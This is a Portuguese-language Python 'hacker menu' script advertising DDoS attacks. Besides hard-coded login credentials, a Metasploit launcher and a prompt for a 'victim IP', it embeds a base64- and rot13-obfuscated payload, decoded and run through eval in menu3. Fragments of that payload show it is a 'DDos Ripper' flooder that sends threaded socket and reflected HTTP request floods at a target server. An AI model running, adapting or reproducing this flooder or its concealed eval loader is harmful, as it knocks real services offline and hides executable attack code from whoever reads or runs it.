import sys
import base64, codecs
import os
import time
import getpass
import colorama
from colorama import init, Fore, Back, Style     # Adicionando cores no scripts//Codificando..
init(autoreset=True)
def menu():
    os.system('clear')
    print(Fore.RED +Back.GREEN +  ''' ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▄▄██████▄                                      #Versao 1.7 Atulizada e melhorada... Ainda em desenvolvimento!
▒▒▒▒▒▒▒▒▒▒▄▄████████████▄
▒▒▒▒▒▒▄▄██████████████████                                 {*****Powered******}
▒▒▒▄████▀▀▀██▀██▌███▀▀▀████                                {                  }
▒▒▐▀████▌▀██▌▀▐█▌████▌█████▌                               {Ciador:Em Anonimo }
▒▒█▒▒▀██▀▀▐█▐█▌█▌▀▀██▌██████                               {Versao: 1.7       }
▒▒█▒▒▒▒████████████████████▌                               {********By********}
▒▒▒▌▒▒▒▒█████░░░░░░░██████▀
▒▒▒▀▄▓▓▓▒███░░░░░░█████▀▀
▒▒▒▒▀░▓▓▒▐█████████▀▀▒
▒▒▒▒▒░░▒▒▐█████▀▀▒▒▒▒▒▒
▒▒░░░░░▀▀▀▀▀▀▒▒▒▒▒▒▒▒▒
▒▒▒░░░░░░░░▒▒▒▒▒▒▒▒▒▒''')


    print('                         𝚂𝚎𝚓𝚊 𝙱𝚎𝚖 𝚅𝚒𝚗𝚍𝚘 𝚄𝚜𝚞𝚊𝚛𝚒𝚘 :))	') 
    time.sleep(4) #Tempo de 4 segundos
    nomes_users = 'Ghost'
    nome_correto = nomes_users
    nome = input('𝙐𝙨𝙚𝙧 𝙙𝙚 𝙖𝙘𝙚𝙨𝙨𝙤: ')
     
    if nome == nome_correto:
        print('Ola! senha bem vindo,', nome)
    else:
        print('Usuario incorreto!')
        exit()
    os.system('clear')
    time.sleep(1)
    print('')

    senha_correta = 'MRROBOT0405'
    senha_digitada = getpass.getpass('Digite a senha: ')

    if senha_digitada == senha_correta:
         time.sleep(2)
         print(Back.GREEN + Fore.YELLOW +  'Acesso Permitido')
    else:
        print('Acesso Negado!')
        exit()
    print('')
    print('𝙰𝚐𝚞𝚊𝚛𝚍𝚎.... 𝙲𝚊𝚛𝚛𝚎𝚐𝚊𝚗𝚍𝚘 𝚖𝚎𝚗𝚞....') 
    print('')
    
    print(Fore.RED + '''___________________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶ 
_________________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶ 
__¶_¶__________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶______¶__¶__¶ 
__¶_¶__¶______¶¶¶¶¶¶____¶¶¶¶¶¶____¶¶¶¶¶¶______¶_¶_¶ 
¶_¶_¶_¶______¶¶¶¶¶¶______¶¶¶¶______¶¶¶¶¶¶¶____¶¶¶¶¶ 
_¶¶¶¶¶______¶¶¶¶¶¶¶___O_¶¶¶¶¶__O__¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶ 
_¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶____¶¶¶¶¶¶____¶¶¶¶¶¶¶¶¶¶___¶¶¶ 
____¶¶____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶____¶¶ 
____¶_____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶___¶ 
_____¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶¶¶¶¶ 
__________¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶¶ 
___________¶¶¶_____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_____¶¶ 
____________¶¶________¶¶¶¶¶¶¶¶¶¶_______¶¶ 
_____________¶¶¶_______________________¶ 
_______________¶¶____¶¶¶¶¶¶¶¶¶¶¶______¶ 
________________¶¶¶_____¶¶¶¶¶¶¶¶¶¶¶__¶ 
___________________¶¶¶_____¶¶¶¶¶¶¶¶¶¶ 
______________________¶¶¶¶¶__¶¶¶¶¶¶¶¶¶ 
_____________________________¶¶¶¶¶¶¶¶¶¶ 
______________________________¶¶¶¶¶¶¶¶¶
''')

   






    print(Back.GREEN + ''' {DIGITE O NUMERO 1}
              {LOGO DE ENTER....}
    ''')
    digite = input('Digite 1> ')
    if digite == '1':
        menu2()


def menu2():
    os.system('clear')
    print(Back.GREEN + '                                               MENU HACKER - DONO/GHOST/FANTASMA ATAQUES DDOS    ')

    print(Fore.RED + '''  	                        ______________________________
                               {  [1] - Pack de ferramentas  }
                               {  for - Termux and linux     }                                       
                               {                             }                                         --------->AVISO-ACIMA<----------
                               {  [2] - Ir para o ataque     }  
                               {  xDDoS Negação de dados     }                     #Lembando, nao tenho responsabilidade nenhuma sobre suas devidas ações erradas!
                               {                             }
                               {  [3] - Metasploit start     }
                               {                             } 
                               {  [4] - Em manutençao...     }
                               {                             }    
                               {  [00] - Sair                }
                               {                             }
                               {  [5] - Puxa localização>    }
                               {_____________________________}''')
                           
                                                              
    print('')

    print('''                                                                                        ⠀⠀⠀⠀⠀⡴⠋⠉⡊⢁⠀⠀⢬⠀⠉⠋⠈⠥⠤⢍⡛⠒⠶⣄⡀⠀⠀⠀
      {-------------Power OF--------------}                                                 ⠀ ⠀⠀⠀⣾⠥⠀⠀⠊⢭⣾⣿⣷⡤⠀⣠⡀⡅⢠⣶⣮⣄⠉⠢⠙⡆⠀⠀
      {NÃO ME RESPONSABILIZO PELO MAH USO!}                                                  ⠀⠀⣠⡾⣁⡨⠴⠢⡤⣿⣿⣿⣿⣿⠸⡷⠙⣟⠻⣯⣿⣟⣃⣠⡁⢷⣄⠀
      {SCRIPT COM VARIAS FUNÇÕES LEGAIS   }                                                  ⠀⡼⡙⣜⡕⠻⣷⣦⡀⢙⠝⠛⡫⢵⠒⣀⡀⠳⡲⢄⣀⢰⣫⣶⡇⡂⠙⡇
      {-------------Power ON--------------}                                                   ⢸⡅⡇⠈⠀⠀⠹⣿⣿⣷⣷⣾⣄⣀⣬⣩⣷⠶⠧⣶⣾⣿⣿⣿⡷⠁⣇⡇
                                                HACKING... ANTI PEDOFILOS!!                    ⠳⣅⢀⢢⠡⠀⡜⢿⣿⣿⡏⠑⡴⠙⣤⠊⠑⡴⠁⢻⣿⣿⣿⠇⢀⡞⠀
                                                                                               ⠀⠘⢯⠀⡆⠀⠐⡨⡻⣿⣧⣤⣇⣀⣧⣀⣀⣷⣠⣼⣿⣿⣿⠀⢿⠀⠀
                                                                XSXSXSXSXSX                   ⠀⠀⠀⠈⢧⡐⡄⠀⠐⢌⠪⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⢸⠀⠀
⠀⠀⠀⠀                                                                                              ⠀⠙⢾⣆⠠⠀⡁⠘⢌⠻⣿⣿⠻⠹⠁⢃⢹⣿⣿⣿⡇⡘⡇⠀
⠀⠀⠀⠀⠀                                                                                               ⠀⠀⠈⠛⠷⢴⣄⠀⢭⡊⠛⠿⠿⠵⠯⡭⠽⣛⠟⢡⠃⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀                                                                                             ⠀⠀⠀⠈⠙⠲⠬⣥⣀⡀⠀⢀⠀⠀⣠⡲⢄⡼⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                                                               ⠀⠀⠀⠀⠈⠉⠙⠓⠒⠒⠒⠋⠉⠀⠀ 
    ''')
    print('')

    opcao = input ('Digite a opção que deseja: ')
    if opcao == '1':
        os.system('git clone https://github.com/ivam3/termux-packages.git')
    elif opcao == '2':
        menu3()
    elif opcao == '3':
        os.system('msfconsole')
    elif opcao == '00':
        exit()
    elif opcao == '5':
        menu4()

    else:
        print('opçao invalida!')
        menu()
    


def menu3():
    magic = 'IyEvdXNyL2Jpbi9weXRob24zDQojIC0qLSBjb2Rpbmc6IHV0Zi04IC0qLQ0KDQoNCg0KaW1wb3J0IHN5cw0KZnJvbSBxdWV1ZSBpbXBvcnQgUXVldWUNCmZyb20gb3B0cGFyc2UgaW1wb3J0IE9wdGlvblBhcnNlcg0KaW1wb3J0IHRpbWUsc3lzLHNvY2tldCx0aHJlYWRpbmcsbG9nZ2luZyx1cmxsaWIucmVxdWVzdCxyYW5kb20NCg0KcHJpbnQoJycnDQoNCg0K4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyAg4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVlyAgICDilojilojilojilojilojilojilZcg4paI4paI4pWX4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilojilZfilojilojilojilojilojilojilZcNCuKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKVlOKVkOKVkOKVkOKVkOKVnSAgICDilojilojilZTilZDilZDilojilojilZfilojilojilZHilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilojilojilZfilojilojilZTilZDilZDilZDilZDilZ3ilojilojilZTilZDilZDilojilojilZcNCuKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWRICDilojilojilZHilojilojilZEgICDilojilojilZHilojilojilojilojilojilojilojilZcgICAg4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4pWR4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4pWXICDilojilojilojilojilojilojilZTilZ0NCuKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWRICDilojilojilZHilojilojilZEgICDilojilojilZHilZrilZDilZDilZDilZDilojilojilZEgICAg4paI4paI4pWU4pWQ4pWQ4paI4paI4pWX4paI4paI4pWR4paI4paI4pWU4pWQ4pWQ4pWQ4pWdIOKWiOKWiOKVlOKVkOKVkOKVkOKVnSDilojilojilZTilZDilZDilZ0gIOKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVlw0K4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4pWU4pWd4pWa4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4paI4paI4paI4paI4paI4pWRICAgIOKWiOKWiOKVkSAg4paI4paI4pWR4paI4paI4pWR4paI4paI4pWRICAgICDilojilojilZEgICAgIOKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSAg4paI4paI4pWRDQrilZrilZDilZDilZDilZDilZDilZ0g4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWdICDilZrilZDilZDilZDilZDilZDilZ0g4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdICAgIOKVmuKVkOKVnSAg4pWa4pWQ4pWd4pWa4pWQ4pWd4pWa4pWQ4pWdICAgICDilZrilZDilZ0gICAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWdICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgwqlFbmdpbmVSaXBwZXINCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVmZXJlbmNlIGJ5IEhhbW1lcg0KJycnKQ0KDQpkZWYgdXNlcl9hZ2VudCgpOg0KCWdsb2JhbCB1YWdlbnQNCgl1YWdlbnQ9W10NCgl1YWdlbnQuYXBwZW5kKCJNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4wKSBPcGVyYSAxMi4xNCIpDQoJdWFnZW50LmFwcGVuZCgiTW96aWxsYS81L'
    love = 'wNtXStkZGftIJW1oaE1BlOZnJ51rPOcAwt2BlOlqwblAv4jXFOUMJAeol8lZQRjZQRjZFOTnKWyMz94YmV2YwNvXD0XPKIuM2IhqP5upUOyozDbVx1irzyfoTRiAF4jVPuLZGR7VSH7VRkcoaI4VUt4Ay82AQftMJ4gIIZ7VUW2BwRhBF4kYwZcVRqyL2giYmVjZQxjBGRmVRMcpzIzo3tiZl41YwZvXD0XPKIuM2IhqP5upUOyozDbVx1irzyfoTRiAF4jVPuKnJ5xo3qmBlOIBlOKnJ5xo3qmVR5HVQLhZGftMJ47VUW2BwRhBF4kYwZcVRqyL2giYmVjZQxjBQV0VRMcpzIzo3tiZl41YwZtXP5BEIDtD0kFVQZhAF4mZQplBFxvXD0XPKIuM2IhqP5upUOyozDbVx1irzyfoTRiAF4jVPuKnJ5xo3qmVR5HVQLhZvxtDKOjoTIKMJWYnKDiAGZ1YwptXRgVIR1ZYPOfnJgyVRqyL2giXFOQo21iMT9sEUWuM29hYmR2YwRhZF4jVRAbpz9gMF8kAv4jYwxkZv42ZlOGLJMupzxiAGZ1YwpvXD0XPKIuM2IhqP5upUOyozDbVx1irzyfoTRiAF4jVPuKnJ5xo3qmBlOIBlOKnJ5xo3qmVR5HVQHhZwftMJ4gIIZ7VUW2BwRhBF4kYwZcVRqyL2giYmVjZQxjBQV0VRMcpzIzo3tiZl41YwZtXP5BEIDtD0kFVQZhAF4mZQplBFxvXD0XPKIuM2IhqP5upUOyozDbVx1irzyfoTRiAF4jVPuKnJ5xo3qmBlOIBlOKnJ5xo3qmVR5HVQLhZGftMJ4gIIZ7VUW2BwRhBF4kYwRcVRqyL2giYmVjZQxjAmR4VRMcpzIzo3tiZl41YwRvXD0XPKIuM2IhqP5upUOyozDbVx1irzyfoTRtYlN1YwNbJQRkB0kcoaI4VTx2BQL7VUW2BwtkYwNcVRqyL2giVP8tZwNkZQNkZQRtEzylMJMirPNiVQtkYwNvXD0XPKIuM2IhqP5upUOyozDbVx1irzyfoTRtYlN1YwNbGTyhqKu4BQMsAwD7paL6BQRhZPxtE2Iwn28tYlNlZQRjZQRjZHMcpzIzo3ttYlN4ZF4jVvxAPty1LJqyoaDhLKOjMJ5xXPWAo3ccoTkuVP8tAF4jXStkZGgILaIhqUH7GTyhqKucAwt2B3W2BwtkYwNcVRqyL2giVP8tZwNkZQNkZQSTnKWyMz94VP8tBQRhZPVcQDbWqJSaMJ50YzSjpTIhMPtvGJ96nJkfLFNiVQHhZPuLZGR7IJW1oaE1B0kcoaI4rQt2KmL0B3W2BwtkYwNcVRqyL2giVP8tZwNkZQNkZQSTnKWyMz94VP8tBQRhZPVcQDbWqJSaMJ50YzSjpTIhMPtvGJ96nJkfLFNiVQHhZPuLZGR7EzIxo3WuB0kcoaI4rQt2KmL0B3W2BwtkYwNcVRqyL2giVP8tZwNkZQNkZQSTnKWyMz94VP8tBQRhZPVcQDbWpzI0qKWhXUIuM2IhqPxAPt0XQDbAPzEyMvOgrI9vo3EmXPx6QDbWM2kiLzSfVTWiqUZAPtyvo3EmCIgqQDbWLz90pl5upUOyozDbVzu0qUN6Yl92LJkcMTS0o3VhqmZho3WaY2AbMJAeC3IlnG0vXD0XPJWiqUZhLKOjMJ5xXPWbqUEjBv8iq3q3YzMuL2Ivo29eYzAioF9mnTSlMKVip2uupzIlYaObpQ91CFVcQDbWpzI0qKWhXTWiqUZcQDbAPt0XMTIzVT15K2WiqUZlXPx6QDbWM2kiLzSfVTWiqUZAPtyvo3EmCIgqQDbWLz90pl5upUOyozDbVzu0qUN6Yl92LJkcMTS0o3VhqmZho3WaY2AbMJAeC3IlnG0vXD0XPJWiqUZhLKOjMJ5xXPWbqUEjBv8iq3q3YzMuL2Ivo29eYzAioF9mnTSlMKVip2uupzIlYaObpQ91CFVcQDbWpzI0qKWhXTWiqUZcQDbAPt0XQDcxMJLtLz90K3WcpUOypzyhMlu1pzjcBt0XPKElrGbAPtxWq2ucoTHtIUW1MGbAPtxWPKWypFN9VUIloTkcLv5lMKS1MKA0YaIloT9jMJ4bqKWfoTyvYaWypKIyp3DhHzIkqJImqPu1pzjfnTIuMTIlpm17W1ImMKVgDJqyoaDaBvOlLJ5xo20hL2uinJAyXUIuM2IhqPy9XFxAPtxWPKOlnJ50XPWpZQZmJmx1oJWiqPOcplOlnKOjMKWcozphYv5pZQZmJmOgVvxAPtxWPKEcoJHhp2kyMKNbYwRcQDbWMKuwMKO0Bt0XPDy0nJ1yYaAfMJIjXP4kXD0XQDcxMJLtLz90K2SaLJyhK3WcpUOypzyhMlu1pzjcBt0XPKElrGbAPtxWq2ucoTHtIUW1MGbAPtxWPKWypFN9VUIloTkcLv5lMKS1MKA0YaIloT9jMJ4bqKWfoTyvYaWypKIyp3DhHzIkqJImqPu1pzjfVT'
    god = 'hlYWRlcnM9eydVc2VyLUFnZW50JzogcmFuZG9tLmNob2ljZSh1YWdlbnQpfSkpDQoJCQlwcmludCgiXDAzM1s5MG1hZ2FpbiBib3QgaXMgcmlwcGVyaW5nLi4uXDAzM1swbSIpDQoJCQl0aW1lLnNsZWVwKC4xKQ0KCWV4Y2VwdDoNCgkJdGltZS5zbGVlcCguMikNCg0KDQpkZWYgZG93bl9pdChpdGVtKToNCgl0cnk6DQoJCXdoaWxlIFRydWU6DQoJCQlwYWNrZXQgPSBzdHIoIkdFVCAvIEhUVFAvMS4xXG5Ib3N0OiAiK2hvc3QrIlxuXG4gVXNlci1BZ2VudDogIityYW5kb20uY2hvaWNlKHVhZ2VudCkrIlxuIitkYXRhKS5lbmNvZGUoJ3V0Zi04JykNCgkJCXMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQoJCQlzLmNvbm5lY3QoKGhvc3QsaW50KHBvcnQpKSkNCgkJCWlmIHMuc2VuZHRvKCBwYWNrZXQsIChob3N0LCBpbnQocG9ydCkpICk6DQoJCQkJcy5zaHV0ZG93bigxKQ0KCQkJCXByaW50ICgiXDAzM1s5Mm0iLHRpbWUuY3RpbWUodGltZS50aW1lKCkpLCJcMDMzWzBtIFwwMzNbOTJtIDwtLXBhY2tldCBzZW50ISByaXBwZXJpbmctLT4gXDAzM1swbSIpDQoJCQllbHNlOg0KCQkJCXMuc2h1dGRvd24oMSkNCgkJCQlwcmludCgiXDAzM1s5MW1zaHV0PC0+ZG93blwwMzNbMG0iKQ0KCQkJdGltZS5zbGVlcCguMSkNCglleGNlcHQgc29ja2V0LmVycm9yIGFzIGU6DQoJCXByaW50KCJcMDMzWzkxbW5vIGNvbm5lY3Rpb24hIHdlYiBzZXJ2ZXIgbWF5YmUgZG93biFcMDMzWzBtIikNCgkJI3ByaW50KCJcMDMzWzkxbSIsZSwiXDAzM1swbSIpDQoJCXRpbWUuc2xlZXAoLjEpDQoNCg0KZGVmIGRvcygpOg0KCXdoaWxlIFRydWU6DQoJCWl0ZW0gPSBxLmdldCgpDQoJCWRvd25faXQoaXRlbSkNCgkJcS50YXNrX2RvbmUoKQ0KDQoNCmRlZiBkb3MyKCk6DQoJd2hpbGUgVHJ1ZToNCgkJaXRlbT13LmdldCgpDQoJCWJvdF9yaXBwZXJpbmcocmFuZG9tLmNob2ljZShib3RzKSsiaHR0cDovLyIraG9zdCkNCgkJdy50YXNrX2RvbmUoKQ0KDQojZGVmIGRvczMoKToNCiAgIyAgd2hpbGUgVHJ1ZToNCiAgIyAgICAgIGl0ZW0gPSBlLmdldCgpDQogICMgICAgICBib3RfcmlwcGVyaW5nKHJhbmRvbS5jaG9pY2UoYm90cykrImh0dHA6Ly8iK2hvc3QpDQogICMgICAgICBlLnRhc2tfZG9uZSgpDQoNCmRlZiB1c2FnZSgpOg0KCXByaW50ICgnJycgXDAzM1swOzk1bUREb3MgUmlwcGVyIA0KCQ0KCUl0IGlzIHRoZSBlbmQgdXNlcidzIHJlc3BvbnNpYmlsaXR5IHRvIG9iZXkgYWxsIGFwcGxpY2FibGUgbGF3cy4NCglJdCBpcyBqdXN0IGxpa2UgYSBzZXJ2ZXIgdGVzdGluZyBzY3JpcHQgYW5kIFlvdXIgaXAgaXMgdmlzaWJsZS4gUGxlYXNlLCBtYWtlIHN1cmUgeW91IGFyZSBhbm9ueW1vdXMhIFxuDQoJVXNhZ2UgOiBweXRob24zIGRyaXBwZXIucHkgWy1zXSBbLXBdIFstdF0gWy1xXQ0KCS1oIDogLWhlbHANCgktcyA6IC1zZXJ2ZXIgaXANCgktcCA6IC1wb3J0IGRlZmF1bHQgODANCgktcSA6IC1xdWlldA0KCQ0KCS10IDogLXR1cmJvIGRlZmF1bHQgMTM1IG9yIDQ0MyBcMDMzWzBtICcnJykNCg0KCXN5cy5leGl0KCkNCg0KDQpkZWYgZ2V0X3BhcmFtZXRlcnMoKToNCglnbG9iYWwgaG9zdA0KCWdsb2JhbCBwb3J0DQoJZ2xvYmFsIHRocg0KCWdsb2JhbCBpdGVtDQoJb3B0cCA9IE9wdGlvblBhcnNlcihhZGRfaGVscF9vcHRpb249RmFsc2UsZXBpbG9nPSJSaXBwZXJzIikNCglvcHRwLmFkZF9vcHRpb24oIi1zIiwiLS1zZXJ2ZXIiLCBkZXN0PSJob3N0IixoZWxwPSJhdHRhY2sgdG8gc2VydmVyIGlwIC1zIGlwIikNCglvcHRwLmFkZF9vcHRpb24oIi1wIiwiLS1wb3J0Iix0eXBlPSJpbnQiLGRlc3Q9InBvcnQiLGhlbHA9Ii1wIDgwIGRlZmF1bHQgODAiKQ0KCW9wdHAuYWRkX29'
    destiny = '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'
    joy = '\x72\x6f\x74\x31\x33'
    trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
    eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))

def menu4():
    os.system('clear')
    print('                                                          MENU ACHA LOCALIZAÇÃO - ANTI PEDOFILO!!!!    ')

    print('')
    print('''       _______________________________ 
               { [1] Clique aqui para ir para }
               {   o geolocalizador de pdfls  }
               {                              }
               { [2] Clique aqui para voltar  }
               {     Ao menu anterior!!!      }
               {______________________________}
''')

    escola = input('Escolha: ')


    if escola == '1':
        digite = input('Digite o ip da vitima: ')
    elif escola == '2':
        menu2()



menu()

